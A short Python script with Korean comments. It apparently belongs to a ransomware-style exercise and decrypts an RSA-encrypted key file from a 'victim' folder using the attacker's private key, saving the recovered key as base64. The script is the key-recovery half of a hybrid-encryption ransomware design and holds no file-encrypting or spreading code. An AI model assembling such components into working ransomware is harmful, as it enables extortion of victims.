from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from base64 import b64encode

#RSA로 암호화한 key.bin를 복호화한다. 
file_in = open("../victim/key.bin", "rb")#key.bin을 읽어온다. (victim 폴더 내에 있음)
private_key = RSA.import_key(open("./private.pem").read()) #공격자 폴더(key-recovery 프로그램이 있는 폴더)에 있는 privatekey를 가져온다. 
enc_data = file_in.read(private_key.size_in_bytes())#복
cipher_rsa = PKCS1_OAEP.new(private_key)#PKCS1_OAEP를 이용하여 복호화한다. 
data = cipher_rsa.decrypt(enc_data)
file_out = open("./key.txt", "wb")#key.txt로 복호화한 내용을 저장할 것이므로 쓰기모드로 파일을 연다. 
data = b64encode(data)# data를 base64로 인코드한다.
file_out.write(data)#복호화되고 base64로 인코드된 데이터를 파일에 저장한다. 
file_in.close()#파일을 닫는다. 
